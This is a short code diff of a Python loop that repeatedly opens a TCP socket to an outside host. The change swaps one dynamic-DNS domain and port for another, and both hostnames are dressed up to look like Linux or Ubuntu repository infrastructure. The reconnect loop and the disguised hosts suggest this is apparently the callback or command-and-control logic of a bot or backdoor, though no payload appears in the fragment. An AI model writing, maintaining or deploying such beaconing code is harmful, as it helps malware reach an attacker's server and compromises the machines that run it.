@@ -4,7 +4,7 @@ while 1:
     try:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("linux-x86-tcpudp.strangled.net", 21))
+            s.connect(("ubuntu-repo.strangled.net", 8090))
 
             try: local_ip = s.getsockname()
             except: local_ip = "Legacy"
